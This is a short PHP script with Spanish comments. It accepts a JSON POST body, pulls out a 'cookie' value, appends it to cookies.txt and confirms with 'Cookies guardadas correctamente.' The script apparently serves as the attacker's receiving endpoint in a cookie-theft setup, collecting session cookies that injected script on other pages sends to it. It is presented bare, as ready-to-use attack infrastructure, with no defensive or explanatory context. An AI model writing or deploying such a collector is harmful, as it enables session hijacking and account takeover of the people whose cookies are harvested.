<?php
// Recibir las cookies enviadas por el cliente
$data = json_decode(file_get_contents('php://input'), true);
$cookie = $data['cookie'];

// Guardar las cookies en un archivo
file_put_contents('cookies.txt', $cookie . PHP_EOL, FILE_APPEND);

echo "Cookies guardadas correctamente.";
?>